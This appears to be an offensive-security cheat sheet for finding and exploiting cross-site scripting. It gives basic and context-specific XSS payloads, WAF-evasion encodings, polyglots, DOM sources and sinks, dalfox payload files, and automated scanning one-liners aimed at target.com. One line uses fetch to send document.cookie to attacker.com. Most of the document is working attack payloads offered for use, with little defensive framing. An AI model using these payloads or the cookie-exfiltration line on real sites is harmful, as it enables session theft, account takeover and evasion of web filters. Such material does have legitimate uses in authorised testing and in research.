# XSS — Payloads, Context Bypass & WAF Evasion

## Basic Payload Types

```html
<!-- Script tag -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>x</option></select>

<!-- Href/src injection -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">

<!-- Less common but valid -->
<details open ontoggle=alert(1)>
<math><mtext></mtext><mglyph><svg><mtext></mtext><text><foreignObject><img src=x onerror=alert(1)>
```

## Context-Specific Payloads

### Inside HTML attribute (unquoted)
```
x onmouseover=alert(1)
x onfocus=alert(1) autofocus
```

### Inside quoted HTML attribute
```
"onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><script>alert(1)</script>
```

### Inside JavaScript string
```javascript
// Single-quoted:
';alert(1)//
\';alert(1)//

// Double-quoted:
";alert(1)//

// Template literal:
${alert(1)}
```

### Inside `<script>` block (no quotes needed)
```javascript
</script><script>alert(1)</script>
```

### URL parameter (href/src context)
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### CSS context
```css
}</style><script>alert(1)</script>
```

## WAF Bypass Techniques

### Encoding
```html
<!-- HTML entity encoding -->
<img src=x o&#110;error=alert(1)>
<img src=x onerror="&#97;lert(1)">

<!-- URL encoding (for URL contexts) -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Mixed encoding -->
<img src=x onerror=\u0061lert(1)>

<!-- Double encoding -->
%253Cscript%253E
```

### Case variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Whitespace / comments
```html
<script>/**/alert(1)/**/</script>
<script>    alert(1)    </script>
<img/src=x/onerror=alert(1)>
<img src = x onerror = alert(1)>
```

### Alternative event handlers
```html
<!-- Many WAFs only check common events -->
<svg onbegin=alert(1)>
<details/open/ontoggle=alert(1)>
<input/onauxclick=alert(1)>
<form id=x><button form=x formaction=javascript:alert(1)>
<object data=javascript:alert(1)>
```

### Non-ASCII
```html
<!-- Use full-width characters -->
＜script＞alert(1)＜/script＞
```

### Without parentheses (CSP/filter bypass)
```javascript
// Using backticks
alert`1`
confirm`1`

// Using throw
window.onerror=alert;throw 1

// Using eval
eval('alert\x281\x29')

// Template literal IIFE
`${alert(1)}`
```

### Without `alert` (CSP sandbox bypass)
```javascript
// Confirm / prompt
confirm(1)
prompt(1)

// print() triggers dialog
print()

// fetch to exfiltrate data
fetch('https://attacker.com/?c='+document.cookie)

// DOM redirect
location='javascript:alert(1)'
```

## DOM XSS Sources and Sinks

### Common Sources (inputs to DOM)
```
location.href
location.search
location.hash
document.referrer
window.name
document.URL
document.baseURI
postMessage data
localStorage / sessionStorage
```

### Common Sinks (dangerous functions)
```javascript
// Execution sinks:
eval()
setTimeout(string)
setInterval(string)
Function(string)
document.write()
document.writeln()
location.href = tainted
location.assign(tainted)

// HTML injection sinks:
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
jQuery .html()
jQuery .append() / .prepend()
jQuery .after() / .before()
```

## XSS Polyglot Payloads

Single payloads that fire in multiple contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```html
<!-- Works in HTML, href, src, event handler contexts -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>
```

## Data URI and SVG Bypass

```html
<!-- Data URI (works in href/src where JS protocol blocked) -->
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">

<!-- SVG variants -->
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- srcdoc bypass -->
<iframe srcdoc="<script>alert(1)</script>">
```

## dalfox Custom Payload File Format

```
# payloads.txt - one payload per line
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>
```

## gf XSS Patterns

`gf xss` (from [tomnomnom/gf](https://github.com/tomnomnom/gf)) filters URLs to those with params historically associated with XSS. Common parameter names matched:

```
q, s, search, query, keyword, lang, redirect, url, next, view, cat, id,
ref, callback, return, page, text, name, val, data, content, action,
src, href, to, from, target, out, view, display, show
```

```bash
# Install gf patterns
go install github.com/tomnomnom/gf@latest
git clone https://github.com/1ndianl33t/gf-patterns ~/.gf

# Use in pipeline
waybackurls target.com | gf xss | dalfox pipe
```

## Useful One-Liners for Hunting

```bash
# Find all URLs with parameters from Wayback Machine
gau target.com | grep "=" | uro

# Find reflected parameters (grep for value in response)
echo "http://target.com/search?q=XSS_CANARY" | \
    httpx -sr -silent | \
    grep -i "XSS_CANARY"

# Automated XSS with qsreplace
gau target.com | grep "=" | \
    qsreplace '"><script>alert(1)</script>' | \
    httpx -silent -mr '<script>alert(1)</script>'

# kxss: find reflected params quickly
echo "http://target.com" | waybackurls | kxss
```
